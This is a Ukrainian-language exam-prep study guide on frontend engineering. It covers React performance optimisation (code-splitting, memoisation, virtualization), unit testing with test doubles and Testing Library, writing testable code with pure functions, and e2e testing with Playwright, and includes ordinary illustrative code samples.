**🎯 Відповідь на іспиті:** Оптимізація великого UI-застосунку починається з діагнозу, бо «повільно» — це дві різні хвороби: повільний старт (великий стартовий bundle) і повільний рантайм (зайві ререндери, гігантський DOM, дорогі обробники), і ліки в них не взаємозамінні. Старт лікується code-splitting-ом: bundle ріжеться на chunks — окремі файли, які вантажаться на вимогу через `lazy` + `Suspense`; насамперед це lazy-loading роутів (студент не має платити за код адмінки) і важких залежностей на кшталт бібліотеки графіків, а ефект перевіряється bundle analyzer-ом до/після. Рантайм лікується прицільно по тому, що показав профайлер: мемоізація (`React.memo`) проти зайвих ререндерів, віртуалізація проти списків на тисячі рядків, debounce/throttle проти частих дорогих обробників. Третій важіль — правильна модуляризація: code-splitting ріже bundle по межах модулів, тож якщо код розкладений по фічах, «сторінка = chunk» виходить природно, а в клубку, де все імпортує все, bundler фізично не може відділити чанк — погана структура блокує оптимізацію. Типові помилки: оптимізація без діагнозу і `React.memo`/`useMemo` на всьому підряд «про запас».

«Застосунок повільний» — це два *різні* захворювання, і перший крок оптимізації — діагноз, а не ліки (як міряти — Q6, Q7):

| Симптом | Хвороба | Важіль |
|---|---|---|
| Довгий білий екран при першому відкритті | **Завантаження**: великий стартовий bundle | code-splitting, lazy-loading, аудит залежностей (Q3) |
| Відкривається швидко, але лагає при діях | **Рантайм**: зайві ререндери, важкі обчислення, гігантський DOM | мемоізація, віртуалізація, debounce |

Плутанина коштує днів: мемоізація ніяк не пришвидшить перше відкриття, а code-splitting не вилікує лаг вводу.

**Гілка 1 — повільний старт.** Причина майже завжди одна: користувач змушений завантажити, розпарсити й виконати JS *усього застосунку*, щоб побачити *одну* сторінку. Ліки — **code-splitting**: розбити bundle на chunks (окремі JS-файли) і вантажити на вимогу. У React це `lazy` + `Suspense`:
```tsx
import { lazy, Suspense } from "react";
// ДО: import AdminPage from "./features/admin/AdminPage" — адмінка у стартовому bundle ДЛЯ ВСІХ
// ПІСЛЯ: динамічний import → Vite виносить адмінку в окремий chunk
const AdminPage = lazy(() => import("./features/admin/AdminPage"));

<Suspense fallback={<Spinner />}>   {/* що показати, поки chunk їде мережею */}
  <AdminPage />
</Suspense>
```
Перше, що ріжуть, — **роути** (студент, який ніколи не відкриє адмінку, не має платити за її код), друге — **важкі залежності** (Q3):
```tsx
const Chart = lazy(() => import("./HeavyChart")); // бібліотека графіків їде лише на дашборд
```
Ефект вимірюється, а не оцінюється на око: bundle analyzer до/після (Q3) + мережа в DevTools.

**Гілка 2 — повільний рантайм.** Тут три типові причини, кожна зі своїм інструментом:
- **Зайві ререндери** (діагноз — React Profiler, «Why did this render?», Q7). Ліки — мемоізація по виміряних місцях:
```tsx
const List = React.memo(function List({ items }: { items: Item[] }) {
  return <>{items.map((i) => <Row key={i.id} {...i} />)}</>;
}); // ← ререндериться лише при зміні items; вимагає стабільних посилань у пропсах (Q10)
```
- **Гігантський DOM** — список на тисячі рядків. Ліки — віртуалізація (див. похідне).
- **Часті дорогі обробники** — фільтрація на кожен символ, обчислення на кожен scroll. Ліки — debounce/throttle (див. похідне) і винесення дорогого з гарячого шляху.

**Третій важіль, який робить перші два можливими, — модуляризація.** Code-splitting ріже bundle по межах модулів: якщо код розкладений по фічах із чіткими межами (Q9, Q12), то «сторінка = chunk» виходить природно, а зміни лишаються локальними. У «клубку», де все імпортує все, bundler фізично не може відділити адмінку — вона вчеплена в стартовий код тисячею імпортів. Погана структура блокує оптимізацію — це головний неочевидний зв'язок цього питання.

**Типові помилки:** (1) оптимізація без діагнозу — тиждень на мемоізацію, коли проблема в 2 MB стартового bundle; (2) `React.memo`/`useMemo` на всьому підряд «про запас» — шум у коді й власна ціна мемоізації без виміряного зиску; (3) розрізати на chunks занадто дрібно — 40 мікро-запитів замість одного файла теж повільно.

**Підсумок-якір:** спершу діагноз — старт чи рантайм; старт лікується code-splitting-ом (роути, важкі залежності) і аудитом bundle; рантайм — прицільною мемоізацією, віртуалізацією і debounce по місцях, які показав профайлер; а можливим усе це робить модульна структура коду.

**➕ Пов'язане: що таке віртуалізація списків? 🔵**
Це ліки від «гігантського DOM» з гілки 2. Проблема в цифрах: журнал групи на 5000 рядків × ~20 DOM-вузлів на рядок = 100 000 вузлів — браузер повільно будує їх, повільно рахує layout, а користувач бачить заледве 20 рядків одночасно. **Віртуалізація** (react-window, TanStack Virtual) рендерить лише видиме вікно + невеликий запас, а решту висоти «симулює» порожнім контейнером, перевикористовуючи DOM-вузли при скролі. DOM тримає ~30 вузлів-рядків незалежно від того, 5 тисяч елементів у даних чи 500 тисяч. Ціна: рядки поза вікном фізично відсутні (ламається Ctrl+F по сторінці), а варіативна висота рядків вимагає додаткової конфігурації — тому для сотні рядків віртуалізація не потрібна.

**➕ Пов'язане: чим `React.memo` відрізняється від `useMemo`? 🔵**
Обидва з'являлися в гілці 2 — розведемо, бо плутають постійно. **`React.memo`** — обгортка над *компонентом*: «не ререндер цей компонент, якщо його пропси не змінились» (порівняння поверхневе, за посиланнями — тому й потрібні стабільні посилання з Q10). **`useMemo`** — хук *усередині* компонента: «не перераховуй це значення, якщо залежності не змінились» (кешує результат обчислення). Зв'язка типова: `useMemo` у батька стабілізує об'єкт/масив → `React.memo` у дитини бачить «пропси ті самі» → пропускає ререндер. Перше — про «чи рендерити компонент», друге — про «чи перераховувати значення».

**➕ Пов'язане: навіщо debounce/throttle у важких обробниках? 🟢**
Ліки від «частих дорогих обробників» з гілки 2. Обидва скорочують *кількість* викликів, по-різному: **debounce** — «виконай після паузи»: пошук по студентах шле запит не на кожен символ, а раз — коли користувач перестав друкувати на 300 мс (друкуєш «Марія» — 1 запит замість 5); **throttle** — «не частіше ніж раз на N мс»: обробник scroll спрацьовує 10 разів за секунду замість 200, але *регулярно* (важливо для прогрес-барів і анімацій за скролом). Вибір: важливий лише фінальний стан → debounce; потрібні проміжні оновлення в реальному часі → throttle.

**➕ Пов'язане: що таке Core Web Vitals (LCP, INP, CLS)? 🔵**
Метрики Google, які перетворюють «швидко/повільно» з основної відповіді на числа — і мапляться прямо на наші дві гілки. **LCP** (Largest Contentful Paint) — коли з'явився найбільший видимий елемент; ціль < 2.5 с; поганий LCP = хвороба «завантаження» → гілка 1. **INP** (Interaction to Next Paint) — затримка між дією користувача і оновленням екрана; ціль < 200 мс; поганий INP = хвороба «рантайму» (Long Tasks з Q6) → гілка 2. **CLS** (Cumulative Layout Shift) — наскільки контент «стрибає» при завантаженні (картинки без розмірів, банери, що розштовхують текст); ціль < 0.1. Міряються Lighthouse-ом (лабораторно) і збираються з реальних користувачів (field data) — тож це готові KPI для оптимізації: не «здається, стало швидше», а «LCP впав з 4.1 с до 2.2 с».

## Q15. Що таке unit-тестування (mocks, fakes, shallow/mount, pre/post-conditions)? 🟢

**🎯 Відповідь на іспиті:** Unit-тест — це ізольована перевірка одного маленького шматка коду за контрактом «якщо на вході таке-то (pre-condition), то на виході буде таке-то (post-condition)» — без реального бекенду чи БД, тому він швидкий і точно вказує на винного. Залежності підмінюються тестовими двійниками: stub — заглушка з заготованою відповіддю, mock — двійник, на якому перевіряють сам факт і параметри виклику, fake — спрощена, але робоча реалізація (in-memory замість справжньої БД). Щодо shallow проти mount: shallow-рендер без дочірніх компонентів застарів разом з Enzyme, бо тестував деталі реалізації, — сучасний підхід (Testing Library) рендерить компонент повністю і перевіряє поведінку так, як її бачить користувач.

Спершу — навіщо. Ти рефакториш функцію розрахунку прогресу курсу, яку використовують п'ять екранів. Без тестів єдиний спосіб перевірити, що нічого не зламалось, — прокликати руками всі п'ять екранів (і все одно щось пропустити). З тестами — `npm test`, 10 секунд, і червоним підсвічено саме те, що зламалось. **Тести — це страхувальна сітка, що робить зміни коду дешевими і безстрашними**; побічний бонус — вони документують очікувану поведінку краще за коментарі.

**Unit-тест** перевіряє один маленький шматок (функцію, компонент) **ізольовано** від решти системи — без реального бекенду, БД чи браузера. Саме ізольованість робить його швидким (мілісекунди) і точним (упав — винен цей шматок, а не «десь щось»).

**Pre/post-conditions** — людською мовою це контракт тесту: «*якщо* на вході таке-то (pre-condition — що істинне до виконання), *то* на виході буде таке-то (post-condition — що мусить бути істинним після)». Кожен тест — одна перевірка контракту:
```ts
import { describe, it, expect } from "vitest";

function discount(price: number, percent: number): number {
  return price - (price * percent) / 100;
}
describe("discount", () => {
  it("рахує знижку", () => {
    expect(discount(200, 10)).toBe(180); // pre: price=200, percent=10 → post: 180
  });
});
```

**Тестові двійники** — підробки залежностей, щоб ізолювати тестований шматок. Три види, які плутають (усі три у vitest робляться через `vi.fn()`/ручні об'єкти — різниця в *призначенні*):
- **Stub** — «заглушка з заготованою відповіддю»: підставляєш, щоб код мав що повернути; сам stub нічого не перевіряє. `const api = { getCourse: () => ({ id: 1, title: "TS" }) }`.
- **Mock** — двійник, на якому **перевіряють взаємодію**: чи викликали, скільки разів, з чим. `const save = vi.fn(); ...; expect(save).toHaveBeenCalledWith({ id: 1 })` — тест про те, *що код зробив*, а не що повернув.
- **Fake** — спрощена, але **робоча** реалізація: in-memory Map замість справжньої БД, об'єкт-сховище замість localStorage. Поводиться як справжня річ, лише без інфраструктури.
Правило вибору: потрібне лише повернення → stub; перевіряєш сам виклик → mock; залежність активно використовується в багатьох місцях тесту → fake.

**Shallow vs mount — і чому shallow застарів.** В епоху Enzyme компоненти рендерили «мілко» (shallow — без дочірніх компонентів) або повністю (mount). Shallow здавався «чистішим unit-ом», але тестував **деталі реалізації**: розбив компонент на два — тести червоні, хоча користувач жодної різниці не бачить. Сучасний підхід — **Testing Library**: рендер повністю і запити так, як шукає користувач (за роллю, текстом, лейблом), без доступу до state чи внутрішньої структури. Тест ламається лише тоді, коли ламається *поведінка* — а рефакторинг внутрішностей він переживає мовчки:
```tsx
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";

test("додає студента до списку", async () => {
  render(<StudentForm onAdd={vi.fn()} />);                       // Arrange: pre-condition — порожня форма
  await userEvent.type(screen.getByLabelText("Ім'я"), "Марія");  // Act: дії ЯК КОРИСТУВАЧ —
  await userEvent.click(screen.getByRole("button", { name: "Додати" })); //   за лейблом і роллю, не за CSS-класом
  expect(screen.getByText("Марія")).toBeInTheDocument();         // Assert: post-condition — студентка видима
});
```

**Типова помилка** — тестувати реалізацію замість поведінки: лізти в state, перевіряти «викликався саме цей внутрішній метод», прив'язуватись до CSS-класів. Такі тести падають від кожного рефакторингу — і сітка, що мала давати безстрашність, починає карати за зміни.

**Підсумок-якір:** unit-тест = ізольована перевірка контракту «вхід → вихід» (pre → post); залежності підмінюються stub-ом (повернути), mock-ом (перевірити виклик) або fake-ом (робоча спрощена версія); компоненти тестуй Testing Library — як користувач, за поведінкою, — а не shallow-рендером за внутрішньою структурою.

**➕ Пов'язане: що таке патерн AAA (Arrange-Act-Assert)? 🟢**
Придивись до RTL-тесту вище — коментарі Arrange/Act/Assert у ньому вже стоять. **AAA** — стандартна структура тесту з трьох блоків: **Arrange** — підготувати світ (відрендерити компонент, створити stub-и, задати pre-conditions); **Act** — виконати рівно одну дію, яку тестуємо (ввід, клік, виклик функції); **Assert** — перевірити post-conditions. Користь: тести читаються однаково, а «поплилий» тест видно одразу — якщо в одному тесті три Act-и і десять Assert-ів, це кілька тестів, склеєних в один, і при падінні незрозуміло, що саме зламалось.

**➕ Пов'язане: що таке code coverage і чи 100% — мета? 🟢**
Coverage — відсоток рядків/гілок коду, виконаних під час тестів (`vitest --coverage`). Корисний як пошук білих плям: «модуль оплати покритий на 20%» — тривожний сигнал. Але як самоціль — шкідливий: рядок «виконався» ≠ «перевірений» (тест без жодного `expect` дає ті самі відсотки), а гонитва за цифрою породжує тести заради тестів на тривіальному коді. Практика: тримай високе покриття критичної бізнес-логіки (розрахунки, права доступу), не вимагай 100% від розмітки і конфігів — важлива якість перевірок, а не площа.

**➕ Пов'язане: як мокати API у компонентних тестах (MSW)? 🟢**
У RTL-тесті вище компонент був простий — а що, як він робить `fetch`? Мокати сам `fetch`/axios (`vi.mock("axios")`) можна, але це знову тест реалізації: перейдеш з axios на fetch — тести впали, хоча поведінка та сама. **MSW** (Mock Service Worker) перехоплює запити на **мережевому рівні**: описуєш «на GET /api/courses відповідай ось таким JSON» — і компонент робить свій звичайний запит, не знаючи, що сервер несправжній. Тест перевіряє повний ланцюг «запит → стан завантаження → рендер даних», а зміна HTTP-клієнта його не ламає.

## Q16. Як писати код з високою тестованістю (чисті та імутабельні функції)? 🔵

**🎯 Відповідь на іспиті:** Код з високою тестованістю — це передбачуваний код, і стоїть він на двох стовпах: чисті функції (той самий вхід завжди дає той самий вихід і нічого зовні не змінює — тест зводиться до одного `expect` без підготовки світу) та імутабельність (не мутувати вхідні дані, а повертати нові значення). Імутабельність у React критична подвійно: об'єкти передаються за посиланням, і React визначає зміни порівнянням посилань — мутований масив має те саме посилання, тож зміни ніхто не побачить. Головний практичний прийом — виносити бізнес-логіку з компонентів у чисті функції: розрахунок на кшталт `calcProgress` тестується без React і без моків, а компоненту лишається один-два поведінкові тести. Загальний принцип: побічні ефекти — на краї застосунку (запити, сховища, DOM), ядро логіки — чисте всередині. Типова помилка — «тестованість потім»: спершу компонент-комбайн, а далі години моків і крихкі тести, бо тестованість — властивість дизайну коду, а не тестів.

Тестованість вирішується не в тестах, а **в коді, який тестуєш**. Порівняй дві задачі: перевірити функцію «вхід → вихід» — три рядки тесту; перевірити компонент, який сам тягне дані, сам рахує прогрес і сам пише в localStorage — годинна споруда з моків. Різниця не у майстерності тестувальника, а в **передбачуваності** коду. Два стовпи передбачуваності — чисті функції та імутабельність.

**Чиста функція** — (1) той самий вхід завжди дає той самий вихід і (2) нічого зовні не змінює:
```ts
// ❌ нечиста: результат залежить від зовнішньої змінної І змінює її —
//    тест мусить готувати глобальний стан і прибирати за собою, тести залежать від порядку
let total = 0;
function addToTotal(x: number) { total += x; return total; }

// ✅ чиста: вхід → вихід, і все. Тест = один expect, без підготовки світу
function add(a: number, b: number): number { return a + b; }
```

**Імутабельність** — не змінювати (не «мутувати») вхідні дані, а повертати нові. Нагадування, чому це критично саме в React: об'єкти в JS передаються **за посиланням** (Q10), і React визначає «чи змінилось» порівнянням посилань — мутований масив має те саме посилання, тож React (і мемоізовані компоненти, і селектори) зміни *не побачить*:
```ts
// ❌ мутує аргумент: у того, хто передав list, дані змінились «за спиною»;
//    у React такий список не спричинить ререндер — посилання те саме
function addItemBad(list: Item[], item: Item) { list.push(item); return list; }

// ✅ повертає новий масив: вихідний неторканий, нове посилання — зміну видно всім
function addItem(list: Item[], item: Item): Item[] { return [...list, item]; }
```

**Головний практичний прийом — виносити логіку з компонентів у чисті функції.** Шлях від нетестованого до тестованого:
```tsx
// ❌ ДО: логіка вшита в компонент — щоб перевірити розрахунок, треба рендерити
//    компонент, мокати useQuery і виколупувати число з DOM
function CourseProgress({ courseId }: { courseId: string }) {
  const { data: lessons } = useLessons(courseId);
  const done = lessons?.filter((l) => l.completedAt != null).length ?? 0;
  const percent = lessons?.length ? Math.round((done / lessons.length) * 100) : 0;
  return <ProgressBar value={percent} />;
}

// ✅ ПІСЛЯ: логіка — окрема чиста функція; компонент лише з'єднує дані з рендером
export function calcProgress(lessons: Lesson[]): number {   // ← тестується БЕЗ React:
  if (lessons.length === 0) return 0;                        //    expect(calcProgress([])).toBe(0)
  const done = lessons.filter((l) => l.completedAt != null).length;
  return Math.round((done / lessons.length) * 100);
}
function CourseProgress({ courseId }: { courseId: string }) {
  const { data: lessons = [] } = useLessons(courseId);
  return <ProgressBar value={calcProgress(lessons)} />;
}
```
Виграш подвійний: крайові випадки (порожній курс, усі уроки завершені, дробові відсотки) перевіряються дешевими unit-тестами чистої функції, а компоненту лишається один-два поведінкові тести (Q15). Загальний принцип: **побічні ефекти — на краї застосунку** (запити, сховища, DOM), **ядро логіки — чисте всередині**.

**Типова помилка** — «тестований код потім»: спершу написати компонент-комбайн, а тестованість лишити тестам. Моки ростуть, тести крихкі, і команда «не встигає писати тести». Тестованість — властивість дизайну коду, вона або закладена, або її треба рефакторити.

**Підсумок-якір:** тестований код = передбачуваний код: чисті функції (той самий вхід → той самий вихід, без ефектів), імутабельні дані (нові значення замість мутацій — це ще й основа реактивності React), логіка витягнута з компонентів у чисті функції, а ефекти — на краях.

**➕ Пов'язане: що таке dependency injection для тестованості? 🔵**
А що робити з логікою, якій *потрібна* залежність — час, API, генератор id? Приклад: `isDeadlineMissed(assignment)` з `new Date()` усередині — це прихована залежність від системного годинника: тест, що проходить сьогодні, впаде завтра. **DI (dependency injection)** — залежність передається ззовні параметром, а не створюється всередині: `isDeadlineMissed(assignment, now: Date)` — і тест передає фіксовану дату, а продакшн-код — справжню. Те саме з API-клієнтом: функція приймає `api` аргументом → тест підставляє fake з Q15 без жодного `vi.mock`. DI повертає функції чистоту: усі входи — явні.

**➕ Пов'язане: що таке side effect і чому він ускладнює тест? 🟢**
Термін, на якому стоїть означення чистої функції вище. **Side effect (побічний ефект)** — будь-який вплив функції на світ поза її поверненням: запис у БД чи localStorage, мережевий запит, `console.log`, зміна глобальної змінної, мутація аргументу, зміна DOM. Чому це ускладнює тест: результат більше не «подивився на return» — треба *перевіряти світ* (що записалось? що відправилось?) і *прибирати* після кожного тесту, інакше тести впливають один на одного і падають залежно від порядку запуску. Тому ефекти ізолюють на краях, а ядро тримають чистим — тест ядра тоді не знає слова «мок».

**➕ Пов'язане: як тестувати код, зав'язаний на час і таймери? 🔵**
Продовження прикладу з годинником у DI. Для *значення* часу — інжектуй `now` параметром (див. вище). Для *таймерів* (debounce з Q10, setInterval, анімації) реальне очікування в тесті неприйнятне — тест на 300 мс паузи × сотні тестів = хвилини марного чекання і flakiness. **Fake timers** підміняють годинник контрольованим: `vi.useFakeTimers()` → викликаєш код → `vi.advanceTimersByTime(300)` «перемотує» час миттєво → перевіряєш результат. Тест debounce-хука виконується за мілісекунди і детерміновано: час став ще одним явним входом, яким керує тест.

## Q17. Що таке e2e-тестування і чим відрізняється від unit? 🟢

**🎯 Відповідь на іспиті:** E2e (end-to-end) — тестування, що запускає справжній браузер і проходить сценарій як користувач, перевіряючи весь ланцюг разом: UI → мережа → бекенд → БД, — тоді як unit перевіряє одну функцію чи компонент ізольовано за мілісекунди. Потрібне воно, бо ловить те, що unit не бачить у принципі, — розриви на стиках системи: фронт шле `courseId` рядком, бекенд чекає число, а всі unit зелені. Оскільки e2e найдорожчі й найкрихкіші, їх пишуть мало і лише на критичні шляхи (логін, оплата, запис на курс) — це вершина піраміди тестів, яку ганяють у CI на merge чи деплой, а крайові випадки лишаються unit-тестам.

Унітів багато, усі зелені — а студент не може записатися на курс: фронт шле `courseId` рядком, бекенд чекає число, і жоден unit цього не бачив, бо кожен перевіряв свій шматок **окремо**. Це діра інтеграції — і саме для неї існує **e2e (end-to-end)**: тест запускає справжній браузер і проходить сценарій так, як користувач — відкрив сторінку, натиснув, побачив результат. Перевіряється весь ланцюг разом: UI → мережа → бекенд → БД.

| | Unit | E2E |
|---|---|---|
| Що перевіряє | Одну функцію/компонент ізольовано | Повний сценарій у справжньому браузері |
| Швидкість | Мілісекунди | Секунди–хвилини |
| Стабільність | Висока | Схильні до flaky (див. нижче) |
| Ціна падіння | Точно вказує на винний шматок | «Десь у ланцюгу» — треба розслідувати |

```ts
import { test, expect } from "@playwright/test";
test("користувач записується на курс", async ({ page }) => {
  await page.goto("/courses/1");
  await page.getByRole("button", { name: "Записатись" }).click(); // ← пошук ЗА РОЛЛЮ, як користувач
  await expect(page.getByText("Ви записані")).toBeVisible();      // ← чекає появи, а не sleep
});
```

**Коли писати e2e і скільки їх треба.** E2e — найдорожчі тести: повільні, крихкі, вимагають живого оточення. Тому їх пишуть **мало і тільки на критичні шляхи** — сценарії, падіння яких означає «бізнес стоїть»: реєстрація/логін, запис на курс, проходження уроку, оплата. Орієнтир — **піраміда тестів**: багато unit (фундамент, ганяються на кожен коміт), помірно integration, **одиниці–десятки e2e** (smoke-набір критичних шляхів). Перевернута піраміда — сотні e2e і жменька unit — це годинні прогони CI і постійні флейки; крайові випадки перевіряй unit-тестами (Q15–Q16), e2e лише підтверджує, що щасливий шлях живий наскрізь.

**Стабільні селектори** — головна побутова навичка e2e. Тест шукає елементи на сторінці, і від *способу пошуку* залежить, чи переживе тест верстку:
```ts
// ❌ крихкий: прив'язаний до структури і стилів — зламається від будь-якого редизайну
await page.locator(".card > div:nth-child(2) .btn-primary").click();

// ✅ стабільні (за спаданням пріоритету):
await page.getByRole("button", { name: "Записатись" }).click(); // роль+ім'я: як бачить користувач,
                                                                // заодно перевіряє доступність (Q2)
await page.getByTestId("enroll-button").click();                // data-testid: явний контракт з тестами,
                                                                // коли ролі/тексту недостатньо
```

**Типова помилка** — лікувати нестабільність через `waitForTimeout(3000)` (фіксований sleep): на швидкій машині це змарновані секунди, на повільній — все одно падає. Правильно — чекати *стану*: `await expect(...).toBeVisible()` сам поллить до появи елемента.

**Підсумок-якір:** e2e ловить те, що unit не бачить в принципі, — розриви на стиках системи; тому їх мало (одиниці–десятки, лише критичні шляхи, вершина піраміди), селектори — за роллю/testid, очікування — стану, а не часу.

**➕ Пов'язане: чим integration-тест відрізняється від e2e? 🟢**
Середній поверх піраміди, згаданої вище. **Integration** перевіряє кілька модулів *разом*, але ще не всю систему: типово — компонент + хук + замоканий API (RTL + MSW з Q15): рендеримо сторінку курсу, MSW відповідає фікстурою, перевіряємо, що дані показались. Це без браузера і бекенду — секунди замість хвилин. **E2e** — весь застосунок у справжньому браузері зі справжнім бекендом. Практична різниця: integration-тести можна ганяти сотнями на кожен коміт, e2e-smoke — на merge/деплой. Integration — «чи дружать сусідні шматки», e2e — «чи живий сценарій наскрізь».

**➕ Пов'язане: що таке flaky-тест і чому e2e часто flaky? 🟢**
**Flaky** — тест, що то проходить, то падає без жодної зміни коду; найтоксичніший вид тестів, бо команда звикає перезапускати червоний CI не дивлячись — і одного дня пропускає справжню поломку. E2e схильні до цього, бо залежать від таймінгів реального світу: елемент ще не відрендерився, запит ще летить, анімація не завершилась, тестові дані змінив сусідній тест. Лікування за пріоритетом: очікування стану замість sleep (`await expect(...).toBeVisible()` — див. основний текст); ізольовані тестові дані (див. наступне питання); вимкнені/прискорені анімації в тестовому оточенні; і правило гігієни — flaky-тест або чиниться одразу, або вимикається з тікетом, але не «перезапускається до зеленого».

**➕ Пов'язане: як готувати тестові дані для e2e (seeding)? 🟢**
Тест «записатися на курс» вище мовчки припускає, що курс `/courses/1` існує і студент залогінений — звідки це береться? Найгірша відповідь — «тести ходять по спільній dev-базі»: дані змінюються під ногами, тести валять один одного — головне джерело flaky. Правильно — кожен прогін готує собі світ сам: **seed** (засівання) бази відомими даними перед прогоном (окрема тестова БД + скрипт/API-виклики, що створюють користувача і курс), а логін — не через UI-форму в кожному тесті, а один раз через API зі збереженням сесії (у Playwright — `storageState`). Принцип той самий, що в unit (Q15): відомий pre-condition перед кожним тестом — інакше post-condition нема з чим звіряти.
